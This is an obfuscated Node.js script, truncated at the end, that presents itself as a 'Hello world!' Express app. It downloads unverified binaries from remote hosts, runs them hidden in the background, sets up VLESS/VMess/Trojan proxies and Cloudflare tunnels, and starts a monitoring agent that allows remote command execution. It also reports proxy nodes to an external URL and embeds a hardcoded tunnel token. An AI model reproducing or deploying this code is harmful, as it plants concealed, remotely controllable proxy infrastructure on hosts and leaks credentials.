const _0x572a93=_0x2d49;(function(_0x3d46a2,_0x494472){const _0xa64a0a={_0x4a2fd7:0x20d,_0x4cd6f5:0x237,_0x32820c:0x1e7,_0x36d130:0x1f0,_0x540c4b:0x27f},_0x4bf483=_0x2d49,_0x59e21a=_0x3d46a2();while(!![]){try{const _0x24e303=-parseInt(_0x4bf483(0x2a0))/0x1+parseInt(_0x4bf483(_0xa64a0a._0x4a2fd7))/0x2+-parseInt(_0x4bf483(_0xa64a0a._0x4cd6f5))/0x3+-parseInt(_0x4bf483(0x271))/0x4*(-parseInt(_0x4bf483(0x249))/0x5)+-parseInt(_0x4bf483(_0xa64a0a._0x32820c))/0x6*(parseInt(_0x4bf483(_0xa64a0a._0x36d130))/0x7)+-parseInt(_0x4bf483(0x255))/0x8*(parseInt(_0x4bf483(0x20f))/0x9)+parseInt(_0x4bf483(_0xa64a0a._0x540c4b))/0xa*(parseInt(_0x4bf483(0x1e6))/0xb);if(_0x24e303===_0x494472)break;else _0x59e21a['push'](_0x59e21a['shift']());}catch(_0x2a0a35){_0x59e21a['push'](_0x59e21a['shift']());}}}(_0x3ca8,0xbc239));const express=require(_0x572a93(0x24e)),app=express(),axios=require(_0x572a93(0x256)),os=require('os'),fs=require('fs'),path=require(_0x572a93(0x242)),{promisify}=require(_0x572a93(0x278)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x572a93(0x222)),UPLOAD_URL=process[_0x572a93(0x26e)][_0x572a93(0x213)]||'',PROJECT_URL=process['env'][_0x572a93(0x27d)]||'',AUTO_ACCESS=process[_0x572a93(0x26e)][_0x572a93(0x269)]||![],FILE_PATH=process[_0x572a93(0x26e)][_0x572a93(0x22a)]||_0x572a93(0x2aa),SUB_PATH=process[_0x572a93(0x26e)][_0x572a93(0x2a3)]||_0x572a93(0x285),PORT=process[_0x572a93(0x26e)][_0x572a93(0x2ab)]||process[_0x572a93(0x26e)]['PORT']||0xbb8,UUID=process[_0x572a93(0x26e)]['UUID']||_0x572a93(0x229),NEZHA_SERVER=process['env'][_0x572a93(0x250)]||'',NEZHA_PORT=process[_0x572a93(0x26e)][_0x572a93(0x264)]||'',NEZHA_KEY=process[_0x572a93(0x26e)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x572a93(0x26e)]['ARGO_DOMAIN']||_0x572a93(0x21f),ARGO_AUTH=process[_0x572a93(0x26e)][_0x572a93(0x291)]||'eyJhIjoiMzRkYjk2YzZlNjQwZjM0YzA3NTc0NmM4OTc1NjgxODUiLCJ0IjoiNTU0ZmYyMTMtYzJkNS00ZjFhLTg1YzktNmVlYTA2MTdmNTg1IiwicyI6Ik1ESTRORFZqTkdZdE5ESmpaUzAwTmpOa0xUZ3pNamN0TldFelpHVmxPV0V5WlRrMCJ9',ARGO_PORT=process['env'][_0x572a93(0x21a)]||0x1f41,CFIP=process[_0x572a93(0x26e)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x572a93(0x26e)][_0x572a93(0x21b)]||0x1bb,NAME=process[_0x572a93(0x26e)][_0x572a93(0x251)]||_0x572a93(0x1f3);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x572a93(0x1f2)](FILE_PATH+_0x572a93(0x201))):console['log'](FILE_PATH+_0x572a93(0x212));function generateRandomName(){const _0x5a1dfb={_0x236903:0x206,_0x4a715e:0x24c},_0x18004e=_0x572a93,_0x228799=_0x18004e(_0x5a1dfb._0x236903);let _0x15898f='';for(let _0x19baa5=0x0;_0x19baa5<0x6;_0x19baa5++){_0x15898f+=_0x228799[_0x18004e(0x221)](Math[_0x18004e(_0x5a1dfb._0x4a715e)](Math[_0x18004e(0x20e)]()*_0x228799['length']));}return _0x15898f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x572a93(0x1e8)](FILE_PATH,npmName),phpPath=path[_0x572a93(0x1e8)](FILE_PATH,phpName),webPath=path[_0x572a93(0x1e8)](FILE_PATH,webName),botPath=path[_0x572a93(0x1e8)](FILE_PATH,botName),subPath=path[_0x572a93(0x1e8)](FILE_PATH,_0x572a93(0x203)),listPath=path[_0x572a93(0x1e8)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x572a93(0x1e8)](FILE_PATH,_0x572a93(0x202));function _0x3ca8(){const _0x4b30c8=['/config.yaml\x22\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','2087','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/bot','/api/add-nodes','direct','Subscription\x20uploaded\x20successfully','post','\x20-s\x20','https://arm64.ssss.nyc.mn/v1','arm','\x20-p\x20','?security=tls&sni=','https://amd64.ssss.nyc.mn/bot','pop','1241316MPWRvF','unshift','2096','SUB_PATH','response','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','TunnelSecret','8443','text/plain;\x20charset=utf-8','App\x20is\x20running','./tmp','SERVER_PORT','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','country_code','arch','2083','715MrMXHf','15258UVEzrb','join','application/json','https://arm64.ssss.nyc.mn/web','Unhandled\x20error\x20in\x20startserver:','Unknown','stringify','unlinkSync','fileUrl','161cWzsHf','http','log','halou3690','\x20>/dev/null\x202>&1\x20&','Download\x20','vmess','taskkill\x20/f\x20/im\x20','xtls-rprx-vision','/api/add-subscriptions','--tls','automatic\x20access\x20task\x20added\x20successfully','nohup\x20','map','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','createWriteStream','org','\x20is\x20created','config.json','sub.txt','/vmess-argo','\x0a\x20\x20credentials-file:\x20','abcdefghijklmnopqrstuvwxyz','clear','mkdirSync','https+local://8.8.8.8/dns-query','\x20>\x20nul\x202>&1','false','\x22\x20>\x20/dev/null\x202>&1','2864134fLFBeV','random','360JFJSuP','tunnel.json','filter','\x20already\x20exists','UPLOAD_URL','basename','\x20is\x20running','Empowerment\x20success\x20for\x20','rm\x20-rf\x20','amd','web\x20running\x20error:\x20','ARGO_PORT','CFPORT','send','push','https://amd64.ssss.nyc.mn/v1','halou3690.halou.eu.org','split','charAt','child_process','https://arm64.ssss.nyc.mn/agent','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','base64','chmod','\x20failed:\x20','all','515663a3-a319-4063-8aaf-865bde6f8100','FILE_PATH','del\x20/f\x20/q\x20','existsSync','Error\x20executing\x20command:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','boot.log','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','trojan','/dev/null','https://ipapi.co/json/','Add\x20automatic\x20access\x20task\x20faild:\x20','tunnel.yml','includes','3934068csUCHk','Nodes\x20uploaded\x20successfully','Content-Type','isFile','get','tcp','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','error','freedom','success','path','php\x20running\x20error:\x20','2053','readdirSync','\x0a\x20\x20\x20\x20','status','unlink','1505685VUJafC','stream','\x0a\x20\x20tunnel:\x20','floor','win32','express','then','NEZHA_SERVER','NAME','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','test','https://amd64.ssss.nyc.mn/agent','184120jgbHzD','axios','/sub.txt\x20saved\x20successfully','443','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','&fp=firefox&type=ws&host=','catch','Hello\x20world!','/tunnel.yml\x20run','ArgoDomain:','Skipping\x20adding\x20automatic\x20access\x20task','Error\x20in\x20startserver:','from','statSync','listen','NEZHA_PORT','npm\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://amd64.ssss.nyc.mn/web','platform','AUTO_ACCESS','\x0a\x0atrojan://','Error\x20reading\x20boot.log:','tls','writeFileSync','env','close','firefox','12BlqOTq','utf-8','length','\x20>/dev/null\x202>&1','Error\x20downloading\x20files:','fileName','forEach','util','none','&path=%2Fvless-argo%3Fed%3D2560#','.exe\x20>\x20nul\x202>&1','/api/delete-nodes','PROJECT_URL','message','302600GzvrDu','data','Empowerment\x20failed\x20for\x20','config.yaml','127.0.0.1','toString','sub','true','?encryption=none&security=tls&sni=','pkill\x20-f\x20\x22[','match','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','readFileSync','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','vless','/vless-argo','\x20-c\x20\x22'];_0x3ca8=function(){return _0x4b30c8;};return _0x3ca8();}function deleteNodes(){const _0x52eb9d={_0x5c8e27:0x211,_0x512575:0x273,_0xdc2ccd:0x298,_0x531afc:0x1e9,_0x896a9d:0x25b},_0x2c4ada=_0x572a93;try{if(!UPLOAD_URL)return;if(!fs[_0x2c4ada(0x22c)](subPath))return;let _0x2001f5;try{_0x2001f5=fs[_0x2c4ada(0x28b)](subPath,'utf-8');}catch{return null;}const _0x8a6716=Buffer['from'](_0x2001f5,_0x2c4ada(0x225))[_0x2c4ada(0x284)](_0x2c4ada(0x272)),_0x352956=_0x8a6716['split']('\x0a')[_0x2c4ada(_0x52eb9d._0x5c8e27)](_0x2679a2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2c4ada(0x253)](_0x2679a2));if(_0x352956[_0x2c4ada(_0x52eb9d._0x512575)]===0x0)return;return axios[_0x2c4ada(_0x52eb9d._0xdc2ccd)](UPLOAD_URL+_0x2c4ada(0x27c),JSON[_0x2c4ada(0x1ed)]({'nodes':_0x352956}),{'headers':{'Content-Type':_0x2c4ada(_0x52eb9d._0x531afc)}})[_0x2c4ada(_0x52eb9d._0x896a9d)](_0x5d3d4d=>{return null;}),null;}catch(_0x1e939d){return null;}}function cleanupOldFiles(){const _0x2a82ff={_0x2a348e:0x245},_0x458547={_0x313d82:0x262,_0x3b391b:0x23a},_0x44e53d=_0x572a93;try{const _0x1ddfc4=fs[_0x44e53d(_0x2a82ff._0x2a348e)](FILE_PATH);_0x1ddfc4['forEach'](_0x1d23e3=>{const _0x527456=_0x44e53d,_0x989729=path['join'](FILE_PATH,_0x1d23e3);try{const _0x1bd90d=fs[_0x527456(_0x458547._0x313d82)](_0x989729);_0x1bd90d[_0x527456(_0x458547._0x3b391b)]()&&fs['unlinkSync'](_0x989729);}catch(_0x1d9b87){}});}catch(_0x236f66){}}app[_0x572a93(0x23b)]('/',function(_0x3ed68a,_0xb9b8f9){const _0xc3cc70={_0x1cfe54:0x21c},_0x341984=_0x572a93;_0xb9b8f9[_0x341984(_0xc3cc70._0x1cfe54)](_0x341984(0x25c));});async function generateConfig(){const _0x298954={_0x248e7e:0x232,_0x24292d:0x279,_0x56bc50:0x23c,_0x7e71c2:0x28d,_0x231399:0x23c,_0x31aade:0x28e,_0x446b4e:0x1f1,_0x3bc812:0x1f1,_0x34e1c8:0x1e8},_0x1d4b77=_0x572a93,_0x50e7a7={'log':{'access':_0x1d4b77(_0x298954._0x248e7e),'error':_0x1d4b77(0x232),'loglevel':_0x1d4b77(_0x298954._0x24292d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1d4b77(0x28d),'settings':{'clients':[{'id':UUID,'flow':_0x1d4b77(0x1f8)}],'decryption':_0x1d4b77(0x279),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x1d4b77(_0x298954._0x56bc50)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x1d4b77(_0x298954._0x7e71c2),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x1d4b77(_0x298954._0x231399),'security':_0x1d4b77(0x279)}},{'port':0xbba,'listen':_0x1d4b77(0x283),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1d4b77(0x279),'wsSettings':{'path':_0x1d4b77(_0x298954._0x31aade)}},'sniffing':{'enabled':!![],'destOverride':[_0x1d4b77(_0x298954._0x446b4e),_0x1d4b77(0x26c),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x1d4b77(0x1f6),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1d4b77(0x204)}},'sniffing':{'enabled':!![],'destOverride':[_0x1d4b77(_0x298954._0x3bc812),_0x1d4b77(0x26c),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1d4b77(0x283),'protocol':_0x1d4b77(0x231),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1d4b77(0x279),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1d4b77(0x1f1),_0x1d4b77(0x26c),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x1d4b77(0x209)]},'outbounds':[{'protocol':_0x1d4b77(0x240),'tag':_0x1d4b77(0x296)},{'protocol':'blackhole','tag':'block'}]};fs[_0x1d4b77(0x26d)](path[_0x1d4b77(_0x298954._0x34e1c8)](FILE_PATH,_0x1d4b77(0x202)),JSON['stringify'](_0x50e7a7,null,0x2));}function _0x2d49(_0x5135e5,_0x413478){const _0x3ca8a9=_0x3ca8();return _0x2d49=function(_0x2d494b,_0x4cde27){_0x2d494b=_0x2d494b-0x1e3;let _0x2bddc0=_0x3ca8a9[_0x2d494b];return _0x2bddc0;},_0x2d49(_0x5135e5,_0x413478);}function getSystemArchitecture(){const _0x19dbd2={_0x5c9046:0x29b},_0x4eec09=_0x572a93,_0x7dc38d=os[_0x4eec09(0x1e4)]();return _0x7dc38d===_0x4eec09(_0x19dbd2._0x5c9046)||_0x7dc38d==='arm64'||_0x7dc38d==='aarch64'?'arm':_0x4eec09(0x218);}function downloadFile(_0x456694,_0x922e1f,_0x1bce5f){const _0x4201a2={_0x522e9a:0x27e},_0xc26dbb={_0x403eb9:0x23f},_0x191d9d={_0x1ca73c:0x23f},_0xbef42={_0x15cfee:0x26f},_0x2cc302=_0x572a93,_0x4e10fb=_0x456694;!fs[_0x2cc302(0x22c)](FILE_PATH)&&fs[_0x2cc302(0x208)](FILE_PATH,{'recursive':!![]});const _0x576b23=fs[_0x2cc302(0x1ff)](_0x4e10fb);axios({'method':_0x2cc302(0x23b),'url':_0x922e1f,'responseType':_0x2cc302(0x24a)})[_0x2cc302(0x24f)](_0x889729=>{const _0x5130a4=_0x2cc302;_0x889729[_0x5130a4(0x280)]['pipe'](_0x576b23),_0x576b23['on']('finish',()=>{const _0x42626b=_0x5130a4;_0x576b23[_0x42626b(_0xbef42._0x15cfee)](),console['log'](_0x42626b(0x1f5)+path[_0x42626b(0x214)](_0x4e10fb)+'\x20successfully'),_0x1bce5f(null,_0x4e10fb);}),_0x576b23['on'](_0x5130a4(_0xc26dbb._0x403eb9),_0x5e81e3=>{const _0x513011=_0x5130a4;fs[_0x513011(0x248)](_0x4e10fb,()=>{});const _0x495a1d='Download\x20'+path[_0x513011(0x214)](_0x4e10fb)+_0x513011(0x227)+_0x5e81e3[_0x513011(0x27e)];console[_0x513011(_0x191d9d._0x1ca73c)](_0x495a1d),_0x1bce5f(_0x495a1d);});})[_0x2cc302(0x25b)](_0x36b4fc=>{const _0x1629ab=_0x2cc302,_0x33c4bb='Download\x20'+path[_0x1629ab(0x214)](_0x4e10fb)+'\x20failed:\x20'+_0x36b4fc[_0x1629ab(_0x4201a2._0x522e9a)];console['error'](_0x33c4bb),_0x1bce5f(_0x33c4bb);});}async function downloadFilesAndRun(){const _0x4fed30={_0xf9c0f7:0x273,_0x20bb59:0x1f2,_0x431ff3:0x1fd,_0x18ff30:0x228,_0x124f7b:0x275,_0x59b5ba:0x29f,_0x41b26a:0x258,_0x348844:0x2a7,_0x3b716e:0x292,_0x3a0316:0x286,_0x32fef9:0x20b,_0x4bf7b7:0x252,_0x714c08:0x22e,_0x27994c:0x282,_0x4242fb:0x28f,_0x1af973:0x290,_0x3bc041:0x1f2,_0x486b4e:0x292,_0x3de9e4:0x244,_0x1a7755:0x236,_0x2216b7:0x1fa,_0x3f5674:0x293,_0x5dcfe8:0x1fc,_0x4d1e39:0x1f2,_0x477e69:0x215,_0x2d1b84:0x25d,_0x263293:0x22d},_0x49e24e={_0x440f14:0x277},_0x143f84={_0xd50332:0x276,_0x3b6198:0x1ef},_0x3099aa=_0x572a93,_0x1baf57=getSystemArchitecture(),_0x38d894=getFilesForArchitecture(_0x1baf57);if(_0x38d894[_0x3099aa(_0x4fed30._0xf9c0f7)]===0x0){console[_0x3099aa(_0x4fed30._0x20bb59)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x52ff53=_0x38d894[_0x3099aa(_0x4fed30._0x431ff3)](_0x221103=>{return new Promise((_0x2a1b6e,_0x2c95fd)=>{const _0x40e2f1=_0x2d49;downloadFile(_0x221103[_0x40e2f1(_0x143f84._0xd50332)],_0x221103[_0x40e2f1(_0x143f84._0x3b6198)],(_0x5220f3,_0x5a39d7)=>{_0x5220f3?_0x2c95fd(_0x5220f3):_0x2a1b6e(_0x5a39d7);});});});try{await Promise[_0x3099aa(_0x4fed30._0x18ff30)](_0x52ff53);}catch(_0x354332){console['error'](_0x3099aa(_0x4fed30._0x124f7b),_0x354332);return;}function _0x14472a(_0x54c869){const _0x127750={_0x13a9b9:0x22c,_0x30eb8a:0x226},_0x4a547a=_0x3099aa,_0x30cf16=0x1fd;_0x54c869[_0x4a547a(_0x49e24e._0x440f14)](_0x106360=>{const _0x438230={_0x22c1d8:0x281},_0x3ae7f3=_0x4a547a;fs[_0x3ae7f3(_0x127750._0x13a9b9)](_0x106360)&&fs[_0x3ae7f3(_0x127750._0x30eb8a)](_0x106360,_0x30cf16,_0x21c0a4=>{const _0xf0073f=_0x3ae7f3;_0x21c0a4?console['error'](_0xf0073f(_0x438230._0x22c1d8)+_0x106360+':\x20'+_0x21c0a4):console[_0xf0073f(0x1f2)](_0xf0073f(0x216)+_0x106360+':\x20'+_0x30cf16[_0xf0073f(0x284)](0x8));});});}const _0x59b5ca=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x14472a(_0x59b5ca);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x144e19=NEZHA_SERVER[_0x3099aa(0x236)](':')?NEZHA_SERVER[_0x3099aa(0x220)](':')[_0x3099aa(_0x4fed30._0x59b5ba)]():'',_0x88ca6d=new Set([_0x3099aa(_0x4fed30._0x41b26a),_0x3099aa(_0x4fed30._0x348844),_0x3099aa(0x2a2),_0x3099aa(_0x4fed30._0x3b716e),_0x3099aa(0x1e5),_0x3099aa(0x244)]),_0x5b47d8=_0x88ca6d['has'](_0x144e19)?_0x3099aa(_0x4fed30._0x3a0316):_0x3099aa(_0x4fed30._0x32fef9),_0x7c4273='\x0aclient_secret:\x20'+NEZHA_KEY+_0x3099aa(_0x4fed30._0x4bf7b7)+NEZHA_SERVER+_0x3099aa(_0x4fed30._0x714c08)+_0x5b47d8+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x3099aa(0x1e8)](FILE_PATH,_0x3099aa(_0x4fed30._0x27994c)),_0x7c4273);const _0x1bcc47='nohup\x20'+phpPath+_0x3099aa(_0x4fed30._0x4242fb)+FILE_PATH+_0x3099aa(_0x4fed30._0x1af973);try{await exec(_0x1bcc47),console[_0x3099aa(_0x4fed30._0x3bc041)](phpName+'\x20is\x20running'),await new Promise(_0x2815a9=>setTimeout(_0x2815a9,0x3e8));}catch(_0x55d829){console[_0x3099aa(0x23f)](_0x3099aa(0x243)+_0x55d829);}}else{let _0x4c3f2e='';const _0x4d6e83=[_0x3099aa(0x258),_0x3099aa(_0x4fed30._0x348844),_0x3099aa(0x2a2),_0x3099aa(_0x4fed30._0x486b4e),_0x3099aa(0x1e5),_0x3099aa(_0x4fed30._0x3de9e4)];_0x4d6e83[_0x3099aa(_0x4fed30._0x1a7755)](NEZHA_PORT)&&(_0x4c3f2e=_0x3099aa(_0x4fed30._0x2216b7));const _0x37c564=_0x3099aa(0x1fc)+npmPath+_0x3099aa(0x299)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3099aa(0x29c)+NEZHA_KEY+'\x20'+_0x4c3f2e+_0x3099aa(_0x4fed30._0x3f5674);try{await exec(_0x37c564),console[_0x3099aa(_0x4fed30._0x3bc041)](npmName+_0x3099aa(0x215)),await new Promise(_0x4f148b=>setTimeout(_0x4f148b,0x3e8));}catch(_0x1ff773){console[_0x3099aa(0x23f)](_0x3099aa(0x265)+_0x1ff773);}}}else console[_0x3099aa(0x1f2)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x12fc02=_0x3099aa(_0x4fed30._0x5dcfe8)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x12fc02),console[_0x3099aa(_0x4fed30._0x4d1e39)](webName+_0x3099aa(_0x4fed30._0x477e69)),await new Promise(_0x114629=>setTimeout(_0x114629,0x3e8));}catch(_0xadda2c){console['error'](_0x3099aa(0x219)+_0xadda2c);}if(fs['existsSync'](botPath)){let _0x5b5b1f;if(ARGO_AUTH[_0x3099aa(0x289)](/^[A-Z0-9a-z=]{120,250}$/))_0x5b5b1f=_0x3099aa(0x266)+ARGO_AUTH;else ARGO_AUTH[_0x3099aa(0x289)](/TunnelSecret/)?_0x5b5b1f=_0x3099aa(0x259)+FILE_PATH+_0x3099aa(_0x4fed30._0x2d1b84):_0x5b5b1f=_0x3099aa(0x1fe)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5b5b1f+_0x3099aa(0x1f4)),console[_0x3099aa(0x1f2)](botName+_0x3099aa(_0x4fed30._0x477e69)),await new Promise(_0xe09809=>setTimeout(_0xe09809,0x7d0));}catch(_0xb0e65e){console['error'](_0x3099aa(_0x4fed30._0x263293)+_0xb0e65e);}}await new Promise(_0xa87df9=>setTimeout(_0xa87df9,0x1388));}function getFilesForArchitecture(_0x43eeae){const _0x1561fd={_0x15e2d2:0x1ea,_0x1fc65d:0x294,_0x597a01:0x223,_0x52debe:0x254,_0x105b54:0x29b,_0x2f4097:0x21e},_0x20d358=_0x572a93;let _0x4692b5;_0x43eeae==='arm'?_0x4692b5=[{'fileName':webPath,'fileUrl':_0x20d358(_0x1561fd._0x15e2d2)},{'fileName':botPath,'fileUrl':_0x20d358(_0x1561fd._0x1fc65d)}]:_0x4692b5=[{'fileName':webPath,'fileUrl':_0x20d358(0x267)},{'fileName':botPath,'fileUrl':_0x20d358(0x29e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x319b4f=_0x43eeae==='arm'?_0x20d358(_0x1561fd._0x597a01):_0x20d358(_0x1561fd._0x52debe);_0x4692b5['unshift']({'fileName':npmPath,'fileUrl':_0x319b4f});}else{const _0x56116c=_0x43eeae===_0x20d358(_0x1561fd._0x105b54)?_0x20d358(0x29a):_0x20d358(_0x1561fd._0x2f4097);_0x4692b5[_0x20d358(0x2a1)]({'fileName':phpPath,'fileUrl':_0x56116c});}}return _0x4692b5;}function argoType(){const _0xfd3efb={_0x3ab50f:0x1f2,_0x503ca9:0x210,_0x348ffd:0x220,_0x279154:0x205,_0x522045:0x224,_0x40658d:0x23d,_0x50876f:0x230},_0xc9c803=_0x572a93;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xc9c803(_0xfd3efb._0x3ab50f)](_0xc9c803(0x28a));return;}if(ARGO_AUTH['includes'](_0xc9c803(0x2a6))){fs[_0xc9c803(0x26d)](path[_0xc9c803(0x1e8)](FILE_PATH,_0xc9c803(_0xfd3efb._0x503ca9)),ARGO_AUTH);const _0x58be27=_0xc9c803(0x24b)+ARGO_AUTH[_0xc9c803(_0xfd3efb._0x348ffd)]('\x22')[0xb]+_0xc9c803(_0xfd3efb._0x279154)+path['join'](FILE_PATH,_0xc9c803(0x210))+_0xc9c803(_0xfd3efb._0x522045)+ARGO_DOMAIN+_0xc9c803(0x28c)+ARGO_PORT+_0xc9c803(_0xfd3efb._0x40658d);fs['writeFileSync'](path[_0xc9c803(0x1e8)](FILE_PATH,_0xc9c803(0x235)),_0x58be27);}else console[_0xc9c803(0x1f2)](_0xc9c803(_0xfd3efb._0x50876f));}async function extractDomains(){const _0x531016={_0x2d3508:0x1ee,_0x15185a:0x1f4,_0x1cb173:0x1f2,_0x44436b:0x215,_0x1fa632:0x23f},_0x1655ec={_0xf3a3ae:0x280,_0x51842a:0x280,_0x40eeec:0x1e3,_0x55dd6d:0x23b,_0x2f6542:0x280,_0x574d03:0x200,_0x4c62fc:0x1ec},_0x46e60d={_0x13b2cc:0x24d,_0x53d48e:0x1f7,_0x1b2f56:0x27b,_0x488a52:0x221,_0x3cc6c1:0x20c},_0x2caaf4=_0x572a93;let _0x1e5529;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1e5529=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x1e5529),await _0x368cc1(_0x1e5529);else try{const _0x4a4399=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),'utf-8'),_0x4d845e=_0x4a4399['split']('\x0a'),_0x5045d9=[];_0x4d845e['forEach'](_0x57076f=>{const _0x56a890=_0x2d49,_0x50bc54=_0x57076f[_0x56a890(0x289)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x50bc54){const _0x297d4b=_0x50bc54[0x1];_0x5045d9['push'](_0x297d4b);}});if(_0x5045d9['length']>0x0)_0x1e5529=_0x5045d9[0x0],console['log'](_0x2caaf4(0x25e),_0x1e5529),await _0x368cc1(_0x1e5529);else{console[_0x2caaf4(0x1f2)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x2caaf4(_0x531016._0x2d3508)](path[_0x2caaf4(0x1e8)](FILE_PATH,_0x2caaf4(0x22f)));async function _0x4b1c6f(){const _0x4d8c64=_0x2caaf4;try{process[_0x4d8c64(0x268)]===_0x4d8c64(_0x46e60d._0x13b2cc)?await exec(_0x4d8c64(_0x46e60d._0x53d48e)+botName+_0x4d8c64(_0x46e60d._0x1b2f56)):await exec(_0x4d8c64(0x288)+botName[_0x4d8c64(_0x46e60d._0x488a52)](0x0)+']'+botName['substring'](0x1)+_0x4d8c64(_0x46e60d._0x3cc6c1));}catch(_0x24e67f){}}_0x4b1c6f(),await new Promise(_0x5b41c8=>setTimeout(_0x5b41c8,0xbb8));const _0x442892='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2caaf4(0x2ac)+ARGO_PORT;try{await exec(_0x2caaf4(0x1fc)+botPath+'\x20'+_0x442892+_0x2caaf4(_0x531016._0x15185a)),console[_0x2caaf4(_0x531016._0x1cb173)](botName+_0x2caaf4(_0x531016._0x44436b)),await new Promise(_0x12c2d4=>setTimeout(_0x12c2d4,0xbb8)),await extractDomains();}catch(_0x2cce9b){console['error'](_0x2caaf4(0x22d)+_0x2cce9b);}}}catch(_0x2e36bc){console[_0x2caaf4(_0x531016._0x1fa632)](_0x2caaf4(0x26b),_0x2e36bc);}async function _0x346aa0(){const _0x538423=_0x2caaf4;try{const _0x2b5748=await axios[_0x538423(0x23b)](_0x538423(0x233),{'timeout':0xbb8});if(_0x2b5748[_0x538423(_0x1655ec._0xf3a3ae)]&&_0x2b5748[_0x538423(_0x1655ec._0x51842a)][_0x538423(_0x1655ec._0x40eeec)]&&_0x2b5748[_0x538423(0x280)][_0x538423(0x200)])return _0x2b5748[_0x538423(_0x1655ec._0x51842a)]['country_code']+'_'+_0x2b5748['data'][_0x538423(0x200)];}catch(_0xae3091){try{const _0x21f4a5=await axios[_0x538423(_0x1655ec._0x55dd6d)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x21f4a5[_0x538423(_0x1655ec._0x2f6542)]&&_0x21f4a5[_0x538423(_0x1655ec._0x2f6542)][_0x538423(0x247)]===_0x538423(0x241)&&_0x21f4a5[_0x538423(_0x1655ec._0x51842a)]['countryCode']&&_0x21f4a5['data'][_0x538423(0x200)])return _0x21f4a5[_0x538423(0x280)]['countryCode']+'_'+_0x21f4a5['data'][_0x538423(_0x1655ec._0x574d03)];}catch(_0x43deb1){}}return _0x538423(_0x1655ec._0x4c62fc);}async function _0x368cc1(_0x1e8e6d){const _0x3564f7={_0x382909:0x279,_0x391ad1:0x26c,_0x29e62d:0x287,_0x358022:0x25a,_0x33189b:0x27a,_0x5c3082:0x26a,_0xb23875:0x29d,_0x1d319c:0x225},_0x30b971=await _0x346aa0(),_0x8b5106=NAME?NAME+'-'+_0x30b971:_0x30b971;return new Promise(_0x2dbff4=>{setTimeout(()=>{const 